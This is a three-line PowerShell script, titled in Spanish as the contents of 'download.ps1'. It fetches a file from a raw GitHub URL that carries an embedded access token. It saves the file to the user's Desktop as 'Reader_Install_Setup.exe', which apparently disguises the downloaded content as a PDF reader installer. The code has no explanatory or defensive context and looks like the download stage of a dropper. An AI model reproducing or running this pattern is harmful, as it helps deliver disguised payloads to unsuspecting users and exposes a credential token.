# Contenido de download.ps1
$url = 'https://raw.githubusercontent.com/Oxxion/Archivos/main/github/workflows/download.ps1?token=GHSAT0AAAAAACM4Y6HLYNADNYGWY3IUW47AZNFZUOA'
$destination = [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop\Reader_Install_Setup.exe')
Invoke-WebRequest -Uri $url -OutFile $destination
